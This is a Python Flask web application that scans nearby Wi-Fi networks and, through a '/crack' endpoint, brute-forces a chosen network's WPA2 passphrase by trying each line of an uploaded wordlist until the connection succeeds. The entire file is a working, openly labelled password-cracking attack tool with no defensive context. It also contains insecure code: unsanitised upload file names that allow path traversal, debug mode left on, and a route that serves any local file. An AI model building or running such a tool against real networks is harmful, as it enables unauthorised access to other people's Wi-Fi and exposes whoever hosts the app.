from flask import Flask, request, jsonify, send_from_directory
import pywifi
from pywifi import const
import time
import os

app = Flask(__name__)

# Function to scan available networks
def scan_networks():
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.scan()
    time.sleep(3)
    scan_results = iface.scan_results()

    available_networks = []
    for network in scan_results:
        if network.ssid and network.ssid not in available_networks:  # Avoid duplicate SSIDs
            available_networks.append(network.ssid)

    return available_networks

# Function to crack Wi-Fi password
def crack_password(network_name, password_file_path):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]

    iface.disconnect()
    time.sleep(1)

    if iface.status() in [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]:
        profile = pywifi.Profile()
        profile.ssid = network_name
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP

        try:
            with open(password_file_path, 'r') as file:
                passwords = file.readlines()
        except FileNotFoundError:
            return "Password file not found", None

        total_passwords = len(passwords)

        for index, password in enumerate(passwords):
            password = password.strip()
            profile.key = password
            iface.remove_all_network_profiles()  # Clear previous profiles
            tmp_profile = iface.add_network_profile(profile)

            iface.connect(tmp_profile)
            time.sleep(3)

            if iface.status() == const.IFACE_CONNECTED:
                iface.disconnect()
                return f"Password found: {password}", None
            else:
                iface.disconnect()
                time.sleep(1)

        return "Password not found", None
    else:
        return "Error disconnecting from network interface", None

# Route to scan available networks
@app.route('/scan', methods=['GET'])
def scan():
    networks = scan_networks()
    return jsonify(networks)

# Route to handle Wi-Fi cracking with file upload
@app.route('/crack', methods=['POST'])
def crack():
    network_name = request.form.get('network')  # Get network name from the form
    password_file = request.files['password_file']  # Get file from form

    # Save the password file to a temporary location
    password_file_path = os.path.join("uploads", password_file.filename)
    password_file.save(password_file_path)

    # Attempt to crack the password
    status, error = crack_password(network_name, password_file_path)

    # Clean up: remove the temporary file
    os.remove(password_file_path)

    if error:
        return jsonify({"status": "error", "message": error}), 500
    return jsonify({"status": "success", "message": status})

# Serve static files (HTML/CSS/JS)
@app.route('/')
def serve_index():
    return send_from_directory('', 'index.html')

@app.route('/<path:path>')
def serve_static(path):
    return send_from_directory('', path)

if __name__ == '__main__':
    if not os.path.exists('uploads'):
        os.makedirs('uploads')  # Create 'uploads' folder if it doesn't exist
    app.run(debug=True)
